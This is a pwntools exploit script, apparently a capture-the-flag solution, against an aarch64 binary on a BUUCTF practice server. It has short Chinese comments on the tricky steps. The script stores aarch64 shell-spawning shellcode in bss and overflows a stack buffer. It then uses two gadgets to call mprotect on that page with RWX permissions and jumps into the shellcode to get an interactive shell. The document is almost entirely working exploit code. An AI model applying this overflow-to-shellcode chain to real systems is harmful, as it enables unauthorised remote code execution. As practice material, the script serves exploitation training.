#coding:utf-8
from pwn import *
context.log_level='debug'
context.binary='./pwn'
p = remote('node3.buuoj.cn',27722)

'''
0x00000000004008cc : ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; 
ldp x23, x24, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret
0x00000000004008ac : ldr x3, [x21, x19, lsl #3] ; mov x2, x22 ; mov x1, x23 ;
 mov w0, w24 ; add x19, x19, #1 ; blr x3
'''
bss=0x0411068
p.recvuntil('Name:')
payload=p64(0x4007e0)+p64(0)+asm(shellcraft.aarch64.sh()) #坑点2
#这里为什么要用0x4007e0，而不是0x400600,在后面揭晓
'''
.plt:0000000000400600 .mprotect
.plt:0000000000400600 ADRP            X16, #off_411030@PAGE
.plt:0000000000400604 LDR             X17, [X16,#off_411030@PAGEOFF]
.plt:0000000000400608 ADD             X16, X16, #off_411030@PAGEOFF
.plt:000000000040060C BR              X17     ; mpr
'''
p.sendline(payload)
payload='a'*(0x40+8)
payload+=p64(0x4008cc)
payload+=p64(0)+p64(0x4008ac)# ldp x29, x30, [sp], #0x40   #坑点1
#将0x4008ac写入$x30，当ret时，返回到0x4008ac
payload+=p64(0)+p64(0)#ldp x19, x20, [sp, #0x10]
payload+=p64(bss)+p64(7)#ldp x21, x22, [sp, #0x20]    
#ldr x3, [x21, x19, lsl #3]，因为需要寻址一次，所以必须将mprotect的地址放在bss里面
payload+=p64(0x1000)+p64(0x411000)#ldp x23, x24, [sp, #0x30]
payload+=p64(0)+p64(bss+0x10)#坑点3
p.send(payload)
p.interactive()
